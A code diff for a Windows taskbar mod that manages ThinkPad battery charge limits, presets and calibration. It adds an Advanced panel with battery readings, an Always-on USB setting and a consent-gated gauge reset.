+        Status(L"Both battery ranges applied.");
+      else
+        Error();
+    }
+    Refresh();
     return;
   }
+  if ((action == 1 || action == 2 || action == 5 || action == 6) &&
+      !AdvancedControls::ThresholdWritesAllowed()) {
+    Status(
+        L"Charging changes are unavailable while calibration is active or its status cannot be "
+        L"confirmed.");
+    Refresh();
+    return;
+  }
+
   if (action == 1)
     Full();
   else if (action == 2) {
@@ -1008,8 +1458,6 @@ void Dispatch(int action, int values) {
 void Submit(int action, int values = 0) noexcept {
   try {
     if (unloading || !wakeEvent) {
-      if (action == 7)
-        SetupStatus(L"Setup is unavailable while the mod stops.");
       return;
     }
     std::lock_guard lock(queueMutex);
@@ -1022,30 +1470,16 @@ void Submit(int action, int values = 0) noexcept {
       return;
     }
     if (commands.size() >= 8) {
-      if (action == 7)
-        SetupStatus(L"Another battery operation is pending. Try setup again shortly.");
       Status(L"Another battery operation is pending.");
       return;
     }
     commands.emplace_back(action, values);
     SetEvent(wakeEvent);
   } catch (...) {
-    if (action == 7)
-      SetupStatus(L"Unable to queue setup. Try again.");
     Status(L"Unable to queue battery operation.");
   }
 }
-// END TESTABLE DISPATCH
-void CALLBACK
-ShellEvent(HWINEVENTHOOK, DWORD, HWND window, LONG object, LONG, DWORD, DWORD) noexcept {
-  if (object != OBJID_WINDOW || unloading)
-    return;
-  wchar_t name[64]{};
-  if (GetClassNameW(window, name, 64) && wcscmp(name, L"Shell_TrayWnd") == 0)
-    SetEvent(wakeEvent);
-}
 DWORD WINAPI Thread(void*) noexcept {
-  HWINEVENTHOOK shellHook = nullptr;
   try {
     // Only the actual shell process owns charging/recovery, even at shell startup.
     for (;;) {
@@ -1061,23 +1495,20 @@ DWORD WINAPI Thread(void*) noexcept {
     }
     Status(L"");
     Load();
+    AdvancedControls::LoadCalibration();
     if (recoveryInvalid)
       Status(L"Recovery data invalid. Apply your desired limits manually.");
-    shellHook = SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_DESTROY, nullptr, ShellEvent,
-                                GetCurrentProcessId(), 0, WINEVENT_OUTOFCONTEXT);
-    ULONGLONG attachAt = 0, checkAt = 0;
-    int attempts = 0;
+    ULONGLONG checkAt = 0, calibrationCheckAt = 0;
     Submit(0);
     for (;;) {
       if (WaitForSingleObject(stopEvent, 0) == WAIT_OBJECT_0)
         break;
-      if (setupCompleted.exchange(false))
-        Refresh();
       auto now = GetTickCount64();
-      if (now >= attachAt) {
-        AttachNativeMenu();
-        attachAt = now + (attempts++ < 10 ? 2000 : 60000);
+      if (AdvancedControls::calibration.slot && now >= calibrationCheckAt) {
+        AdvancedControls::CheckCalibration();
+        calibrationCheckAt = GetTickCount64() + 30000;
       }
+
       if (Active() && now >= checkAt) {
         SYSTEM_POWER_STATUS power{};
         if ((GetSystemPowerStatus(&power) && power.BatteryLifePercent == 100) ||
@@ -1108,7 +1539,9 @@ DWORD WINAPI Thread(void*) noexcept {
         busy = false;
         continue;
       }
-      DWORD delay = DWORD((std::min)(ULONGLONG(60000), attachAt > now ? attachAt - now : 0));
+      DWORD delay = AdvancedControls::calibration.slot
+                        ? DWORD(calibrationCheckAt > now ? calibrationCheckAt - now : 0)
+                        : INFINITE;
       if (Active())
         delay = (std::min)(delay, DWORD(checkAt > now ? checkAt - now : 0));
 
@@ -1116,8 +1549,6 @@ DWORD WINAPI Thread(void*) noexcept {
       DWORD result = MsgWaitForMultipleObjects(2, events, FALSE, delay, QS_ALLINPUT);
       if (result == WAIT_OBJECT_0)
         break;
-      if (result == WAIT_OBJECT_0 + 1)
-        attachAt = 0;
       if (result == WAIT_OBJECT_0 + 2) {
         MSG msg;
         while (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
@@ -1126,10 +1557,6 @@ DWORD WINAPI Thread(void*) noexcept {
         }
       }
     }
-    if (shellHook) {
-      UnhookWinEvent(shellHook);
-      shellHook = nullptr;
-    }
     ULONGLONG empty = 0;
     shutdownDeadline.compare_exchange_strong(empty, GetTickCount64() + 4000);
     if (Active() && !Restore())
@@ -1137,8 +1564,6 @@ DWORD WINAPI Thread(void*) noexcept {
   } catch (...) {
     Error();
   }
-  if (shellHook)
-    UnhookWinEvent(shellHook);
   return 0;
 }
 }  // namespace BatteryControls
@@ -1220,7 +1645,7 @@ XamlRoot GetTaskbarXamlRoot(HWND hTaskbarWnd) {
         b[6] == 0xC1 && b[7] <= 0x7F) {
       taskbarElementIUnknownOffset = b[7];
     } else {
-      Engine::Log(L"Unsupported TaskbarHost::FrameHeight");
+      Wh_Log(L"Unsupported TaskbarHost::FrameHeight");
       std__Ref_count_base__Decref_Original(taskbarHostSharedPtr[1]);
       return nullptr;
     }
@@ -1236,7 +1661,7 @@ XamlRoot GetTaskbarXamlRoot(HWND hTaskbarWnd) {
         (p[3] & 0xFFF00FE0) == 0xF8400C00) {
       taskbarElementIUnknownOffset = (p[3] >> 12) & 0xFF;
     } else {
-      Engine::Log(L"Unsupported TaskbarHost::FrameHeight");
+      Wh_Log(L"Unsupported TaskbarHost::FrameHeight");
     }
   }
 #else
@@ -1268,81 +1693,49 @@ XamlRoot GetTaskbarXamlRoot(HWND hTaskbarWnd) {
 }
 
 using RunFromWindowThreadProc_t = void(WINAPI*)(void*);
+std::mutex uiInvokeMutex;
 struct UiRequest {
-  std::mutex mutex;
-  bool enabled = true;
   RunFromWindowThreadProc_t proc;
   void* parameter;
-  ULONG_PTR nonce;
+  bool done = false;
 };
-std::mutex uiRequestMutex, uiInvokeMutex;
-std::shared_ptr<UiRequest> uiRequest;
-const UINT uiMessage = RegisterWindowMessageW(L"ThinkPadBatteryControls.Internal.Dispatch.v2");
-LRESULT CALLBACK UiHook(int code, WPARAM w, LPARAM l) noexcept {
-  try {
-    if (code == HC_ACTION) {
-      auto message = reinterpret_cast<CWPSTRUCT*>(l);
-      if (message->message == uiMessage) {
-        std::shared_ptr<UiRequest> request;
-        {
-          std::lock_guard lock(uiRequestMutex);
-          request = uiRequest;
-        }
-        if (request) {
-          std::lock_guard lock(request->mutex);
-          if (request->enabled && message->wParam == request->nonce) {
-            request->enabled = false;
-            request->proc(request->parameter);
-          }
-        }
-      }
+UiRequest* pendingUiRequest = nullptr;
+const UINT uiMessage = RegisterWindowMessageW(L"Windhawk_RunFromWindowThread_" WH_MOD_ID);
+LRESULT CALLBACK UiHook(int code, WPARAM w, LPARAM l) {
+  if (code == HC_ACTION) {
+    auto msg = reinterpret_cast<CWPSTRUCT*>(l);
+    if (msg->message == uiMessage && pendingUiRequest && !pendingUiRequest->done) {
+      auto request = pendingUiRequest;
+      request->done = true;
+      request->proc(request->parameter);
     }
-  } catch (...) {
-    BatteryControls::Status(L"Taskbar integration failed.");
   }
   return CallNextHookEx(nullptr, code, w, l);
 }
 bool RunFromWindowThread(HWND window, RunFromWindowThreadProc_t proc, void* parameter) {
-  DWORD thread = GetWindowThreadProcessId(window, nullptr);
-  if (!thread)
+  DWORD pid = 0, thread = GetWindowThreadProcessId(window, &pid);
+  if (!thread || pid != GetCurrentProcessId())
     return false;
   if (thread == GetCurrentThreadId()) {
     proc(parameter);
     return true;
   }
-  std::lock_guard invocation(uiInvokeMutex);
-  auto request = std::make_shared<UiRequest>();
-  request->proc = proc;
-  request->parameter = parameter;
-  if (BCryptGenRandom(nullptr, reinterpret_cast<PUCHAR>(&request->nonce), sizeof(request->nonce),
-                      BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0)
-    return false;
+  std::lock_guard lock(uiInvokeMutex);
   HHOOK hook = SetWindowsHookExW(WH_CALLWNDPROC, UiHook, nullptr, thread);
   if (!hook)
     return false;
-  {
-    std::lock_guard lock(uiRequestMutex);
-    uiRequest = request;
-  }
-  DWORD_PTR result = 0;
-  bool sent = SendMessageTimeoutW(window, uiMessage, request->nonce, 0,
-                                  SMTO_ABORTIFHUNG | SMTO_BLOCK, 2000, &result) != 0;
-  {
-    std::lock_guard lock(request->mutex);
-    request->enabled = false;
-  }
-  {
-    std::lock_guard lock(uiRequestMutex);
-    uiRequest.reset();
-  }
+  UiRequest request{proc, parameter};
+  pendingUiRequest = &request;
+  SendMessageW(window, uiMessage, 0, 0);
+  pendingUiRequest = nullptr;
   UnhookWindowsHookEx(hook);
-  return sent;
+  return request.done;
 }
 
 bool HookTaskbarDllSymbols() {
-  HMODULE module = LoadLibraryEx(L"taskbar.dll", nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32);
+  HMODULE module = GetModuleHandleW(L"taskbar.dll");
   if (!module) {
-    Engine::Log(L"Failed to load taskbar.dll");
+    Wh_Log(L"Failed to load taskbar.dll");
     return false;
   }
 
@@ -1381,28 +1774,25 @@ auto SafeUi(F fn) {
   };
 }
 namespace ModernUI {
-// BEGIN TESTABLE UI REVOCATION
-std::vector<std::function<void()>> uiRevokers;
+[[clang::no_destroy]] std::optional<std::vector<std::function<void()>>> uiRevokers{std::in_place};
 template <class T>
 void TrackEvent(T revoker) {
   auto owned = std::make_shared<T>(std::move(revoker));
-  uiRevokers.emplace_back([owned] { owned->revoke(); });
+  uiRevokers->emplace_back([owned] { owned->revoke(); });
 }
 void RevokeUiEvents() {
-  auto pending = std::move(uiRevokers);
-  uiRevokers.clear();
+  auto pending = std::move(*uiRevokers);
+  uiRevokers->clear();
   for (auto& revoke : pending)
     revoke();
 }
-// END TESTABLE UI REVOCATION
 namespace C = winrt::Windows::UI::Xaml::Controls;
 namespace P = winrt::Windows::UI::Xaml::Controls::Primitives;
-C::MenuFlyout menu{nullptr};
-C::Flyout flyout{nullptr};
-DispatcherTimer pendingMenu{nullptr}, statusTimer{nullptr};
+[[clang::no_destroy]] C::MenuFlyout menu{nullptr};
+[[clang::no_destroy]] C::Flyout flyout{nullptr};
+[[clang::no_destroy]] DispatcherTimer pendingMenu{nullptr}, statusTimer{nullptr};
 struct PresetEditor;
-std::shared_ptr<PresetEditor> presetEditor;
-// BEGIN TESTABLE PRESETS
+[[clang::no_destroy]] std::shared_ptr<PresetEditor> presetEditor;
 struct Preset {
   std::wstring name;
   int start, stop;
@@ -1418,14 +1808,6 @@ bool MatchesPreset(const Preset& p, bool valid, bool enabled, bool temporary, in
   return valid && enabled && !temporary && p.start == start && p.stop == stop;
 }
 constexpr size_t maxPresets = 20, maxQuickPresets = 5;
-struct PresetRecordV1 {
-  wchar_t name[41]{};
-  DWORD start = 0, stop = 0, quick = 0;
-};
-struct PresetStoreV1 {
-  DWORD version = 1, count = 0;
-  PresetRecordV1 rows[maxPresets]{};
-};
 struct PresetRecord {
   wchar_t name[81]{};
   DWORD start = 0, stop = 0, quick = 0;
@@ -1512,6 +1894,24 @@ bool DecodePresets(const PresetStore& data, std::vector<Preset>& result) {
   result = std::move(decoded);
   return true;
 }
+std::wstring PresetStorageKey() {
+  BatteryControls::Handle token;
+  DWORD bytes = 0;
+  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, token.out()))
+    return {};
+  GetTokenInformation(token, TokenUser, nullptr, 0, &bytes);
+  if (!bytes || bytes > 65536)
+    return {};
+  std::vector<BYTE> buffer(bytes);
+  if (!GetTokenInformation(token, TokenUser, buffer.data(), bytes, &bytes))
+    return {};
+  LPWSTR sid = nullptr;
+  if (!ConvertSidToStringSidW(reinterpret_cast<TOKEN_USER*>(buffer.data())->User.Sid, &sid))
+    return {};
+  std::wstring result = L"PresetLibrary." + std::wstring(sid);
+  LocalFree(sid);
+  return result;
+}
 bool SavePresets(const std::vector<Preset>& rows) {
   if (rows.size() > maxPresets)
     return false;
@@ -1529,94 +1929,33 @@ bool SavePresets(const std::vector<Preset>& rows) {
   std::vector<Preset> checked;
   if (!DecodePresets(data, checked))
     return false;
-  HKEY key = nullptr;
-  if (!BatteryControls::OpenRecovery(key))
-    return false;
-  auto rc = RegSetValueExW(key, L"PresetLibrary", 0, REG_BINARY,
-                           reinterpret_cast<const BYTE*>(&data), sizeof(data));
-  RegCloseKey(key);
-  return rc == ERROR_SUCCESS;
+  auto key = PresetStorageKey();
+  return !key.empty() && Wh_SetIntValue((key + L".present").c_str(), 1) &&
+         Wh_SetBinaryValue(key.c_str(), &data, sizeof(data));
 }
 std::vector<Preset> ReadPresets() {
   presetNotice.clear();
+  auto key = PresetStorageKey();
+  if (key.empty()) {
+    presetNotice = L"Unable to identify the current user's preset storage.";
+    return {};
+  }
   PresetStore data;
-  DWORD bytes = sizeof(data), type = 0;
-  HKEY key = nullptr;
-  auto rc =
-      RegOpenKeyExW(HKEY_CURRENT_USER, BatteryControls::recoveryKey, 0, KEY_QUERY_VALUE, &key);
-  if (rc == ERROR_SUCCESS) {
-    rc = RegQueryValueExW(key, L"PresetLibrary", nullptr, &type, reinterpret_cast<BYTE*>(&data),
-                          &bytes);
-    RegCloseKey(key);
-  }
-  if (rc == ERROR_SUCCESS && type == REG_BINARY && bytes == sizeof(PresetStoreV1) &&
-      data.version == 1) {
-    PresetStoreV1 old;
-    memcpy(&old, &data, sizeof(old));
-    data = PresetStore{};
-    data.count = old.count;
-    if (old.count <= maxPresets)
-      for (size_t i = 0; i < old.count; i++) {
-        if (old.rows[i].name[40]) {
-          data.version = 0;
-          break;
-        }
-        std::copy(std::begin(old.rows[i].name), std::end(old.rows[i].name), data.rows[i].name);
-        data.rows[i].start = old.rows[i].start;
-        data.rows[i].stop = old.rows[i].stop;
-        data.rows[i].quick = old.rows[i].quick;
-      }
-    bytes = sizeof(data);
-  }
-  if (rc == ERROR_SUCCESS) {
-    std::vector<Preset> rows;
-    if (type == REG_BINARY && bytes == sizeof(data) && DecodePresets(data, rows))
-      return rows;
-    presetNotice =
-        L"Saved presets could not be read safely. Restore defaults or add replacements, then Save.";
-    BatteryControls::Status(presetNotice.c_str());
-    return {};
-  }
-  if (rc != ERROR_FILE_NOT_FOUND) {
-    presetNotice = L"Unable to read saved presets.";
-    BatteryControls::Status(presetNotice.c_str());
-    return {};
-  }
-  // Migrate the previous Windhawk settings without modifying charging or deleting old entries.
-  std::vector<Preset> result;
-  size_t favorites = 0, ignored = 0;
-  bool any = false;
-  for (int i = 0; i < 128; i++) {
-    auto base = L"presets[" + std::to_wstring(i) + L"].";
-    std::wstring name = Engine::Setting((base + L"name").c_str());
-    int start = Engine::SettingInt((base + L"start").c_str()),
-        stop = Engine::SettingInt((base + L"stop").c_str());
-    if (name.empty() && !start && !stop)
-      continue;
-    any = true;
-    auto originalName = name;
-    name = NormalizeName(name);
-    if (originalName != name)
-      presetNotice = L"Legacy preset names were cleaned up. Review before saving.";
-    bool quick = Engine::SettingInt((base + L"quick").c_str()) != 0 && favorites < maxQuickPresets;
-    if (!ValidPresetName(name) || !BatteryControls::ValidRange(start, stop) ||
-        result.size() >= maxPresets) {
-      ignored++;
-      continue;
+  auto bytes = Wh_GetBinaryValue(key.c_str(), &data, sizeof(data));
+  if (!bytes) {
+    if (Wh_GetIntValue((key + L".present").c_str(), 0)) {
+      presetNotice =
+          L"Saved presets are unavailable. Restore defaults or add replacements, then Save.";
+      return {};
     }
-    if (quick)
-      favorites++;
-    result.push_back({name, start, stop, quick});
+    return DefaultPresets();
   }
-  if (!any)
-    result = DefaultPresets();
-  if (ignored)
-    presetNotice = std::to_wstring(ignored) +
-                   L" legacy presets ignored: invalid name/range or more than 20 entries. Review "
-                   L"before saving.";
-  return result;
+  std::vector<Preset> rows;
+  if (bytes == sizeof(data) && DecodePresets(data, rows))
+    return rows;
+  presetNotice = L"Saved presets are invalid. Restore defaults or add replacements, then Save.";
+  return {};
 }
-// END TESTABLE PRESETS
 std::wstring PresetLabel(const Preset& p) {
   return p.name + L" (" + std::to_wstring(p.start) + L" to " + std::to_wstring(p.stop) + L"%)";
 }
@@ -1635,13 +1974,14 @@ struct Panel {
     }
   }
 };
-std::shared_ptr<Panel> panel;
+[[clang::no_destroy]] std::shared_ptr<Panel> panel;
 struct ThresholdDraft {
   bool valid = false, enabled = false;
   int start = 75, stop = 80;
 };
 ThresholdDraft returningDraft, addPresetDraft;
 int presetReturnView = 0;
+bool preservePanelHost = false;
 void Close() {
   RevokeUiEvents();
   if (statusTimer)
@@ -1653,14 +1993,15 @@ void Close() {
   pendingMenu = nullptr;
   if (menu)
     menu.Hide();
-  if (flyout) {
+  if (flyout && !preservePanelHost) {
     flyout.Hide();
     flyout.Content(nullptr);
   }
   if (menu)
     menu.Items().Clear();
   menu = nullptr;
-  flyout = nullptr;
+  if (!preservePanelHost)
+    flyout = nullptr;
   panel.reset();
 }
 C::TextBlock Text(const std::wstring& value, double size = 14) {
@@ -1710,14 +2051,75 @@ void PositionPanel(FrameworkElement target, C::Flyout current) {
     y = (std::max)(mi.rcWork.top + gap, (std::min)(y, mi.rcWork.bottom - gap - height));
     popup.HorizontalOffset(popup.HorizontalOffset() + (x - bar.left - origin.X * scale) / scale);
     popup.VerticalOffset(popup.VerticalOffset() + (y - bar.top - origin.Y * scale) / scale);
-    Engine::SetString(L"panelPlacement",
-                      (std::to_wstring(int(x)) + L"," + std::to_wstring(int(y)) + L" " +
-                       std::to_wstring(int(width)) + L"x" + std::to_wstring(int(height)))
-                          .c_str());
+    Wh_Log(L"panelPlacement: %s",
+           (std::to_wstring(int(x)) + L"," + std::to_wstring(int(y)) + L" " +
+            std::to_wstring(int(width)) + L"x" + std::to_wstring(int(height)))
+               .c_str());
   }
 }
 void QueuePanel(FrameworkElement target, int view);
 void ShowQuickMenu(FrameworkElement target);
+void ShowMenu(FrameworkElement target);
+void SetPanelContent(C::ScrollViewer scroll, FrameworkElement target, int returnView = -1) {
+  C::StackPanel host;
+  // All settings pages share one work-area-clamped viewport. Content may
+  // scroll, but switching tabs or editing presets never resizes the shell.
+  double width = 560, height = 680;
+  RECT bar{};
+  MONITORINFO mi{sizeof(mi)};
+  if (GetWindowRect(FindWindowW(L"Shell_TrayWnd", nullptr), &bar) &&
+      GetMonitorInfoW(MonitorFromRect(&bar, MONITOR_DEFAULTTONEAREST), &mi)) {
+    double scale = target.XamlRoot().RasterizationScale();
+    width = (std::min)(width, (std::max)(160.0, (mi.rcWork.right - mi.rcWork.left) / scale - 80));
+    height = (std::min)(height, (std::max)(160.0, (mi.rcWork.bottom - mi.rcWork.top) / scale - 80));
+  }
+  host.Width(width);
+  host.Height(height);
+  host.Margin(Thickness{8, 8, 8, 8});
+  host.Spacing(20);
+
+  C::Grid navigation;
+  C::Button back, close;
+  // Use a text arrow, keeping the button label in the normal UI font.
+  back.Content(winrt::box_value(returnView == 0   ? L"\u2190  Charge thresholds"
+                                : returnView == 3 ? L"\u2190  Charging presets"
+                                                  : L"\u2190  Battery menu"));
+  back.HorizontalAlignment(HorizontalAlignment::Left);
+  close.Content(winrt::box_value(L"\u00d7"));
+  close.HorizontalAlignment(HorizontalAlignment::Right);
+  Automation::AutomationProperties::SetName(close, L"Close battery controls");
+  TrackEvent(back.Click(winrt::auto_revoke, SafeUi([target, returnView](auto const&, auto const&) {
+                          QueuePanel(target, returnView);
+                        })));
+  TrackEvent(close.Click(winrt::auto_revoke, SafeUi([](auto const&, auto const&) { Close(); })));
+  navigation.Children().Append(back);
+  navigation.Children().Append(close);
+  host.Children().Append(navigation);
+  navigation.Height(36);
+  scroll.MaxWidth(width);
+  scroll.Width(width);
+  scroll.MaxHeight(height - 56);
+  scroll.Height(height - 56);
+  scroll.HorizontalContentAlignment(HorizontalAlignment::Stretch);
+  scroll.VerticalContentAlignment(VerticalAlignment::Top);
+  if (auto page = scroll.Content().try_as<FrameworkElement>()) {
+    page.Width((std::max)(120.0, width - 24));
+    page.HorizontalAlignment(HorizontalAlignment::Left);
+    page.Margin(Thickness{0, 4, 0, 16});
+  }
+  host.Children().Append(scroll);
+  flyout.Content(host);
+}
+void ShowPanelHost(FrameworkElement target) {
+  if (!flyout.IsOpen())
+    flyout.ShowAt(target);
+  else {
+    if (auto root = flyout.Content().try_as<FrameworkElement>())
+      root.UpdateLayout();
+    PositionPanel(target, flyout);
+  }
+}
+
 C::Grid PresetGrid(bool editing = false) {
   C::Grid grid;
   grid.ColumnSpacing(8);
@@ -1796,7 +2198,6 @@ void EditorCounts(const std::shared_ptr<PresetEditor>& editor) {
     editor->rows[i]->down.IsEnabled(i + 1 < editor->rows.size());
   }
 }
-// BEGIN TESTABLE PRESET ORDER
 template <class T>
 bool MovePresetRow(std::vector<T>& rows, size_t from, size_t slot) {
   if (from >= rows.size() || slot > rows.size())
@@ -1809,7 +2210,6 @@ bool MovePresetRow(std::vector<T>& rows, size_t from, size_t slot) {
   rows.insert(rows.begin() + to, std::move(item));
   return true;
 }
-// END TESTABLE PRESET ORDER
 void MoveEditorRow(const std::shared_ptr<PresetEditor>& editor,
                    const std::shared_ptr<PresetEditorRow>& row,
                    size_t slot) {
@@ -1980,6 +2380,7 @@ void AddEditorRow(const std::shared_ptr<PresetEditor>& editor, const Preset& pre
                                  std::to_wstring((std::min)(slot + 1, editor->rows.size())));
             double viewY = args.GetCurrentPoint(editor->scroll).Position().Y;
             auto now = GetTickCount64();
+
             if (now - editor->lastDragScroll > 80 &&
                 (viewY < 28 || viewY > editor->scroll.ActualHeight() - 28)) {
               editor->lastDragScroll = now;
@@ -2084,7 +2485,8 @@ void ShowPresetEditor(FrameworkElement target) {
   auto editor = presetEditor;
   editor->returnView = presetReturnView;
   std::weak_ptr<PresetEditor> weak = editor;
-  flyout = C::Flyout();
+  if (!preservePanelHost || !flyout)
+    flyout = C::Flyout();
   flyout.ShouldConstrainToRootBounds(false);
   C::StackPanel content;
   content.Width(520);
@@ -2267,15 +2669,8 @@ void ShowPresetEditor(FrameworkElement target) {
     scroll.MaxHeight((std::max)(120.0, (mi.rcWork.bottom - mi.rcWork.top) / scale - 64));
     scroll.MaxWidth((std::max)(200.0, (mi.rcWork.right - mi.rcWork.left) / scale - 64));
   }
-  flyout.Content(scroll);
+  SetPanelContent(scroll, target, editor->returnView);
   flyout.Placement(P::FlyoutPlacementMode::TopEdgeAlignedRight);
-  TrackEvent(flyout.Closed(winrt::auto_revoke, SafeUi([weak, weakTarget = winrt::make_weak(target)](
-                                                          auto const&, auto const&) {
-                             if (auto editor = weak.lock())
-                               if (presetEditor == editor)
-                                 if (auto target = weakTarget.get())
-                                   QueuePanel(target, editor->returnView);
-                           })));
   TrackEvent(flyout.Opened(
       winrt::auto_revoke, SafeUi([weak, addedCurrent](auto const&, auto const&) {
         if (addedCurrent)
@@ -2287,9 +2682,476 @@ void ShowPresetEditor(FrameworkElement target) {
               editor->rows.back()->name.SelectAll();
             }
       })));
-  flyout.ShowAt(target);
+  ShowPanelHost(target);
 }
+// The Advanced panel is rebuilt only on a completed worker request, never on a hardware poll.
+int advancedTab = 0, advancedBattery = 0;
+void RenderAdvanced(C::StackPanel body, FrameworkElement target) {
+  body.Children().Clear();
+  auto snapshot = BatteryControls::AdvancedControls::Read();
+  auto a = snapshot.data;
+  if (!snapshot.message.empty())
+    body.Children().Append(Text(snapshot.message, 12));
+  if (!BatteryControls::IntegratedBackend()) {
+    body.Children().Append(
+        Text(L"Choose Integrated Lenovo service in Windhawk Settings to use these controls."));
+    return;
+  }
+  if (!a.connected) {
+    body.Children().Append(Text(
+        L"No verified Lenovo service capabilities are available. Select Refresh to check again."));
+    return;
+  }
+  auto button = [&](PCWSTR label, auto callback) {
+    C::Button b;
+    b.Content(winrt::box_value(label));
+    TrackEvent(b.Click(winrt::auto_revoke, SafeUi(callback)));
+    body.Children().Append(b);
+    return b;
+  };
+  if (advancedTab != 1) {
+    C::StackPanel selectors;
+    selectors.Orientation(C::Orientation::Horizontal);
+    selectors.Spacing(8);
+    if (!a.batteries[advancedBattery].present)
+      advancedBattery = a.batteries[0].present ? 0 : 1;
+    for (int i = 0; i < 2; i++)
+      if (a.batteries[i].present) {
+        P::ToggleButton b;
+        b.Content(winrt::box_value(L"Battery " + std::to_wstring(i + 1)));
+        b.IsChecked(i == advancedBattery);
+        TrackEvent(b.Click(winrt::auto_revoke, SafeUi([target, body, i](auto const&, auto const&) {
+                             advancedBattery = i;
+                             RenderAdvanced(body, target);
+                           })));
+        selectors.Children().Append(b);
+      }
+    if (a.batteries[0].present && a.batteries[1].present)
+      body.Children().Append(selectors);
+  }
+  auto b = a.batteries[advancedBattery];
+  if (advancedTab == 0) {
+    auto row = [&](PCWSTR label, std::wstring value) {
+      C::Grid g;
+      C::ColumnDefinition left, right;
+      left.Width(GridLength{1, GridUnitType::Star});
+      right.Width(GridLength{1, GridUnitType::Auto});
+      g.ColumnDefinitions().Append(left);
+      g.ColumnDefinitions().Append(right);
+      auto l = Text(label), r = Text(value);
+      C::Grid::SetColumn(r, 1);
+      g.Children().Append(l);
+      g.Children().Append(r);
+      body.Children().Append(g);
+    };
+    auto decimal = [](long value) {
+      wchar_t text[32];
+      swprintf_s(text, L"%.1f", value / 1000.0);
+      return std::wstring(text);
+    };
+    if (b.percent.available)
+      row(L"Charge", std::to_wstring(b.percent.value) + L"%");
+    if (b.full.available && b.design.available)
+      row(L"Full / design capacity",
+          decimal(b.full.value) + L" / " + decimal(b.design.value) + L" Wh");
+    if (b.full.available && b.design.available)
+      row(L"Capacity retained", std::to_wstring((b.full.value * 100LL) / b.design.value) + L"%");
+    if (b.cycles.available)
+      row(L"Charge cycles", std::to_wstring(b.cycles.value));
+    if (b.temperature.available)
+      row(L"Temperature", std::to_wstring(b.temperature.value) + L" \u00c2\u00b0C");
+    if (b.voltage.available)
+      row(L"Voltage", decimal(b.voltage.value) + L" V");
+    if (b.adapter.available)
+      row(L"Power adapter", std::to_wstring(b.adapter.value) + L" W");
+    body.Children().Append(
+        Text(L"Only supported readings are shown. Refresh updates them on demand.", 12));
+  } else if (advancedTab == 1) {
+    if (a.usbSupported) {
+      body.Children().Append(Text(L"Always-on USB", 16));
+      body.Children().Append(Text(
+          L"Supply power to supported USB ports while the laptop is sleeping or shut down.", 12));
+      C::ComboBox choices;
+      for (auto label : {L"Off", L"During sleep", L"During sleep and shutdown"})
+        choices.Items().Append(winrt::box_value(label));
+      choices.SelectedIndex(a.usb);
+      choices.HorizontalAlignment(HorizontalAlignment::Stretch);
+      body.Children().Append(choices);
+      auto apply = button(L"Apply USB setting", [choices](auto const&, auto const&) {
+        Send(21, choices.SelectedIndex());
+      });
+      body.Children().Append(
+          Text(L"This firmware setting can remain active after the mod is removed.", 12));
+    } else
+      body.Children().Append(Text(L"No verified power controls are available on this machine."));
+    body.Children().Append(
+        Text(L"Cooling and airplane controls are omitted until their model-specific behavior is "
+             L"verified.",
+             12));
+  } else {
+    body.Children().Append(Text(L"Battery-gauge reset", 17));
+    body.Children().Append(
+        Text(L"Recalibrate an inaccurate charge estimate. This does not restore worn battery "
+             L"capacity. A full discharge and recharge can take several hours.",
+             12));
+    if (!b.resetCapable || !a.resetKnown) {
+      body.Children().Append(Text(L"Calibration is not available for this battery."));
+      return;
+    }
+    if (a.resetBattery) {
+      body.Children().Append(Text(L"Battery " + std::to_wstring(a.resetBattery) +
+                                  L" is calibrating. Lenovo reports stage " +
+                                  std::to_wstring(a.resetStage) + L" of " +
+                                  std::to_wstring(a.resetStages) + L". Keep power connected."));
+      button(L"Review cancellation...", [body, target, a](auto const&, auto const&) {
+        body.Children().Clear();
+        body.Children().Append(
+            Text(L"Cancel calibration for Battery " + std::to_wstring(a.resetBattery) + L"?", 18));
+        body.Children().Append(
+            Text(L"The charge estimate may remain inaccurate. Charging protection will be checked "
+                 L"once Lenovo confirms calibration is idle.",
+                 12));
+        C::Button confirm;
+        confirm.Content(winrt::box_value(L"Confirm cancellation"));
+        TrackEvent(confirm.Click(winrt::auto_revoke, SafeUi([a, confirm](auto const&, auto const&) {
+                                   confirm.IsEnabled(false);
+                                   Send(23, a.resetBattery);
+                                 })));
+        body.Children().Append(confirm);
+        C::Button back;
+        back.Content(winrt::box_value(L"Back"));
+        TrackEvent(back.Click(winrt::auto_revoke, SafeUi([target, body](auto const&, auto const&) {
+                                RenderAdvanced(body, target);
+                              })));
+        body.Children().Append(back);
+      });
+    } else {
+      button(L"Review and start...", [body, target, slot = advancedBattery + 1](auto const&,
+                                                                                auto const&) {
+        body.Children().Clear();
+        body.Children().Append(Text(L"Calibrate Battery " + std::to_wstring(slot) + L"?", 18));
+        body.Children().Append(Text(
+            L"Save your work and leave the laptop plugged in for several hours. Lenovo controls "
+            L"the discharge and recharge cycle. Charging edits are blocked while it runs.",
+            12));
+        body.Children().Append(
+            Text(L"Current limits are saved first. When calibration ends, disabled protection is "
+                 L"restored; any newer enabled limits are kept. If the mod is removed, check "
+                 L"calibration and limits in Vantage.",
+                 12));
+        C::CheckBox consent;
+        consent.Content(winrt::box_value(L"My work is saved and I can leave power connected."));
+        body.Children().Append(consent);
+        C::Button start;
+        start.Content(winrt::box_value(L"Start calibration"));
+        start.IsEnabled(false);
+        TrackEvent(consent.Checked(winrt::auto_revoke, SafeUi([start](auto const&, auto const&) {
+                                     start.IsEnabled(true);
+                                   })));
+        TrackEvent(consent.Unchecked(winrt::auto_revoke, SafeUi([start](auto const&, auto const&) {
+                                       start.IsEnabled(false);
+                                     })));
+        TrackEvent(start.Click(winrt::auto_revoke,
+                               SafeUi([start, consent, slot](auto const&, auto const&) {
+                                 if (consent.IsChecked().Value()) {
+                                   start.IsEnabled(false);
+                                   Send(22, slot);
+                                 }
+                               })));
+        body.Children().Append(start);
+        C::Button cancel;
+        cancel.Content(winrt::box_value(L"Cancel"));
+        TrackEvent(cancel.Click(
+            winrt::auto_revoke,
+            SafeUi([target, body](auto const&, auto const&) { RenderAdvanced(body, target); })));
+        body.Children().Append(cancel);
+      });
+    }
+  }
+}
+void PresentContent(FrameworkElement target, C::StackPanel content) {
+  if (!preservePanelHost || !flyout)
+    flyout = C::Flyout();
+  flyout.ShouldConstrainToRootBounds(false);
+  C::ScrollViewer scroll;
+  scroll.Content(content);
